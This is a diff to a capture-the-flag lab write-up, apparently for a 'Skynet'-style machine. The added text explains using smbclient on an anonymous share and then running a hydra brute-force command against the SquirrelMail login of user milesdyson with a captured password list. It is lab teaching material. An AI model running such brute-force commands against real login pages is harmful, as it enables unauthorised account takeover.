@@ -74,9 +74,9 @@ We can use the **smbclient** to enter the anonymous share. Here are the commonly
 ```sh
   smbclient '\\10.10.48.162\anonymous'
   ```
-
-
-
-
-hydra -l milesdyson -P log1.txt 10.10.48.162 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." -V -F -u
-
+  
+ We captures a number of logs files, one of which includes a password list potentiall for **milesdyson**. Let's use **hydra** for brute-forcing the email account 
+ 
+ ```sh
+ hydra -l milesdyson -P log1.txt 10.10.48.162 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect" -V -F -u
+```
